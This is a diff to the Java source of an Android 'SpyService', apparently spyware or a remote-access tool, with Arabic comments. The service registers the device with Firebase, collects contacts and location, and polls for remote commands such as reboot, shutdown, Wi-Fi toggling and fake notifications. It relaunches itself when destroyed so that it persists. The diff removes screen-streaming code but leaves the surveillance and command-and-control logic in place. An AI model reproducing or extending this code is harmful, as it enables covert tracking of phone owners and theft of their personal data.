@@ -12,7 +12,6 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
-import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -68,8 +67,6 @@ public class SpyService extends Service {
     private LocationManager locationManager;
     private LocationListener locationListener;
     private boolean isTrackingLocation = false;
-    private MediaProjection mediaProjection;
-    private boolean isStreaming = false;
 
     @Override
     public void onCreate() {
@@ -77,8 +74,8 @@ public class SpyService extends Service {
         context = this;
         
         // تهيئة Firebase
-        if (FirebaseApp.getApps(this).isEmpty()) { // Firebase already initialized in MainActivity }
-            // Firebase already initialized in MainActivity
+        if (FirebaseApp.getApps(this).isEmpty()) {
+            FirebaseApp.initializeApp(this);
         }
         
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -98,7 +95,7 @@ public class SpyService extends Service {
         scheduler = Executors.newScheduledThreadPool(1);
         scheduler.scheduleAtFixedRate(this::listenCommands, 0, Config.get(this).getPollIntervalSec(), TimeUnit.SECONDS);
         
-        Log.d(TAG, "✅ SpyService started successfully");
+        Log.d(TAG, "✅ SpyService started");
     }
 
     private Notification createNotification() {
@@ -126,7 +123,6 @@ public class SpyService extends Service {
             json.put("last_seen", System.currentTimeMillis());
             json.put("status", "online");
             dbRef.child("devices").child(deviceId).setValue(json.toString());
-            Log.d(TAG, "✅ Device registered: " + name);
         } catch (Exception e) { Log.e(TAG, "register error", e); }
     }
 
@@ -176,10 +172,19 @@ public class SpyService extends Service {
         dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
     }
 
-    // ======================================================================
-    // ========== دوال جمع البيانات ==========
-    // ======================================================================
+    private int getBatteryLevel() {
+        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        if (batteryIntent != null) {
+            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+            if (level != -1 && scale != -1) {
+                return (level * 100) / scale;
+            }
+        }
+        return -1;
+    }
 
+    // ===== جمع البيانات =====
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         PrintWriter pw = new PrintWriter(f);
@@ -344,22 +349,7 @@ public class SpyService extends Service {
         return f;
     }
 
-    private int getBatteryLevel() {
-        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-        if (batteryIntent != null) {
-            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-            if (level != -1 && scale != -1) {
-                return (level * 100) / scale;
-            }
-        }
-        return -1;
-    }
-
-    // ======================================================================
-    // ========== دوال الأوامر ==========
-    // ======================================================================
-
+    // ===== دوال الأوامر =====
     private void getLocation() {
         LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
         try {
@@ -642,14 +632,6 @@ public class SpyService extends Service {
         bot.sendMessage("🌐 الشبكة:\n" + net);
     }
 
-    private void takeScreenshot() {
-        if (mediaProjection == null) {
-            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق.");
-            return;
-        }
-        bot.sendMessage("📸 سيتم تطوير لقطة الشاشة باستخدام MediaProjection قريباً");
-    }
-
     private void toggleWifi(boolean on) {
         WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
         wm.setWifiEnabled(on);
@@ -733,47 +715,14 @@ public class SpyService extends Service {
         }
     }
 
-    private void addContact() {
-        bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال");
-    }
+    private void addContact() { bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال"); }
     private void deleteContact() { bot.sendMessage("🗑️ سيتم قريباً حذف جهة اتصال"); }
     private void sendSms() { bot.sendMessage("📤 سيتم قريباً إرسال رسالة"); }
     private void deleteSms() { bot.sendMessage("🗑️ سيتم قريباً حذف رسالة"); }
     private void makeCall() { bot.sendMessage("📞 سيتم قريباً إجراء مكالمة"); }
     private void endCall() { bot.sendMessage("📞 سيتم إنهاء المكالمة قريباً"); }
 
-    // ======================================================================
-    // ========== بث الشاشة (يتم تشغيله فقط عند استلام أمر start_stream) ==========
-    // ======================================================================
-
-    private void startStreaming() {
-        if (mediaProjection == null) {
-            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق ووافق على الطلب.");
-            return;
-        }
-        isStreaming = true;
-        bot.sendMessage("📡 بدء بث الشاشة...");
-        sendData("STREAM", "streaming");
-        new Thread(() -> {
-            while (isStreaming) {
-                try {
-                    sendData("STREAM_HEARTBEAT", "alive");
-                    Thread.sleep(5000);
-                } catch (Exception e) { break; }
-            }
-        }).start();
-    }
-
-    private void stopStreaming() {
-        isStreaming = false;
-        sendData("STREAM", "stopped");
-        bot.sendMessage("⏹ تم إيقاف بث الشاشة");
-    }
-
-    // ======================================================================
-    // ========== تنفيذ الأوامر ==========
-    // ======================================================================
-
+    // ===== تنفيذ الأوامر =====
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
         Log.d(TAG, "Executing: " + lower);
@@ -829,7 +778,6 @@ public class SpyService extends Service {
                 case "reboot": rebootDevice(); break;
                 case "shutdown": shutdownDevice(); break;
                 case "vibrate": vibrateDevice(); break;
-                case "screenshot": takeScreenshot(); break;
                 case "toggle_wifi_on": toggleWifi(true); break;
                 case "toggle_wifi_off": toggleWifi(false); break;
                 case "toggle_bluetooth_on": toggleBluetooth(true); break;
@@ -840,8 +788,6 @@ public class SpyService extends Service {
                 case "set_volume_min": setVolume(false); break;
                 case "open_browser": openBrowser(); break;
                 case "fake_notif": showFakeNotification(); break;
-                case "start_stream": startStreaming(); break;
-                case "stop_stream": stopStreaming(); break;
                 default:
                     sendData("ERROR", "أمر غير معروف: " + cmd);
                     bot.sendMessage("❌ أمر غير معروف: " + cmd);
@@ -853,23 +799,8 @@ public class SpyService extends Service {
         }
     }
 
-    // ======================================================================
-    // ========== دورة حياة الخدمة ==========
-    // ======================================================================
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && intent.hasExtra("mediaProjectionResultCode")) {
-            int resultCode = intent.getIntExtra("mediaProjectionResultCode", 0);
-            Intent data = intent.getParcelableExtra("mediaProjectionData");
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-                mediaProjection = mpManager.getMediaProjection(resultCode, data);
-                bot.sendMessage("✅ تم الحصول على صلاحية تسجيل الشاشة");
-            } else {
-                bot.sendMessage("❌ فشل الحصول على صلاحية تسجيل الشاشة");
-            }
-        }
         return START_STICKY;
     }
 
@@ -887,7 +818,6 @@ public class SpyService extends Service {
             locationManager.removeUpdates(locationListener);
         }
         if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; }
-        isStreaming = false;
         startService(new Intent(this, SpyService.class));
     }
 }
